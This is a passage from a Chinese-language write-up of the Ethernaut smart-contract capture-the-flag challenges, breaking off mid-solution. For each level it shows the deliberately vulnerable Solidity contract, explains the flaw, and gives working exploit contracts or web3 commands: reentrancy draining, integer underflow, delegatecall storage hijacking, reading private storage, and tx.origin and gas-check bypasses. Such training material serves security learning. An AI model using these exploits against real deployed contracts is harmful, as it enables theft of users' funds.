( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1 \u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848 \u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 exp // SPDX-License-Identifier: GPL-3.0 pragma solidity ^ 0.6.0 ; /* code of CoinFlip */ contract Exploit { using SafeMath for uint256 ; CoinFlip p ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor ( address challenge ) public { p = CoinFlip ( challenge ); } function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; p . flip ( side ); } } Telephone \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Telephone { address public owner ; constructor () public { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c \u5b83\u4eec\u7684\u533a\u522b\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -> \u5408\u7ea6 A -> \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A \u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Telephone */ contract Exploit { Telephone p = Telephone ( < instance address > ); function exp () public { p . changeOwner ( msg.sender ); } } Token \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance \u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c \u6240\u4ee5\u901a\u8fc7 await contract . transfer ( < any address > , 21 ) \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927 Delegation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Delegate { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570 \u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570 data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565 \u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" }) Force \u00b6 \u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26 \u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } } Vault \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password \u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb King \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a \u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86 \u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call . gas ( 10000000 ). value ( msg.value )( \"\" ); } fallback () external { revert (); } } \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king Re-entrancy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f msg . sender . call { value : _amount }( \"\" ) \uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances \u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw \u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0 \u5148\u901a\u8fc7 await getBalance ( instance ) \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d Elevator \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true \u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837 \u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } \u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true Privacy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Privacy { bool public locked = true ; uint256 public ID = block.timestamp ; uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) public { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } } \u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock \u540c\u6837\u6765\u7528 web3 . eth . getStorageAt \u6765 dump \u51fa storage\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x0000000000000000000000000000000000000000000000000000000000000001' > await web3 . eth . getStorageAt ( instance , 1 ) '0x00000000000000000000000000000000000000000000000000000000623b0e73' > await web3 . eth . getStorageAt ( instance , 2 ) '0x000000000000000000000000000000000000000000000000000000000e73ff0a' > await web3 . eth . getStorageAt ( instance , 3 ) '0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569' > await web3 . eth . getStorageAt ( instance , 4 ) '0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364' > await web3 . eth . getStorageAt ( instance , 5 ) '0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf' > await web3 . eth . getStorageAt ( instance , 6 ) '0x0000000000000000000000000000000000000000000000000000000000000000' \u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86 \u6240\u4ee5 data[2] \u4e5f\u5c31\u662f 0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf \u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: contract . unlock ( \"0x6710884543189de73f0dfb9d36a99f2a\" ) Gatekeeper One \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract GatekeeperOne { using SafeMath for uint256 ; address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { require ( gasleft (). mod ( 8191 ) == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( tx.origin ), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42 msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570 \u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6 \u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d \u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 81910 )( bytes8 ( \"0x123456\" )); } } \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09 \u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658 \u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910 \u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a 16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0 32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0 0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c \u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a bytes8 ( 0x0000000100000E28 ) \uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 82164 )( bytes8 ( 0x0000000100000E28 )); } } Gatekeeper Two \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { uint x ; assembly { x : = extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg.sender )))) ^ uint64 ( _gateKey ) == uint64 ( 0 ) - 1 ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a msg.sender != tx.origin \u5f53\u524d caller \u7684 codesize \u4e3a 0 gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF \u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3 \u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc \u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperTwo challenge ; constructor ( address addr ) public { challenge = GatekeeperTwo ( addr ); uint64 key = uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( this )))) ^ uint64 ( 0xFFFFFFFFFFFFFFFF ); challenge . enter ( bytes8 ( key )); } } Naught Coin \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player ) ERC20 ( 'NaughtCoin' , '0x0' ) public { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { super . transfer ( _to , _value ); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg.sender == player ) { require ( now > timeLock ); _ ; } else { _ ; } } } \u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol \u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer \u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01 function transferFrom ( address from , address to , uint256 amount ) public virtual override returns ( bool ) { address spender = _msgSender (); _spendAllowance ( from , spender , amount ); _transfer ( from , to , amount ); return true ; } \u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d > ( await contract . balanceOf ( player )). toString () '1000000000000000000000000' > contract . approve ( player , \"1000000000000000000000000\" ) > contract . transferFrom ( player , instance , \"1000000000000000000000000\" ) > ( await contract . balanceOf ( player )). toString () '0' Preservation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } \u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570 \u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8 \u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570 \u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { address public timeZone1Library ; address public timeZone2Library ; address public owner ; // 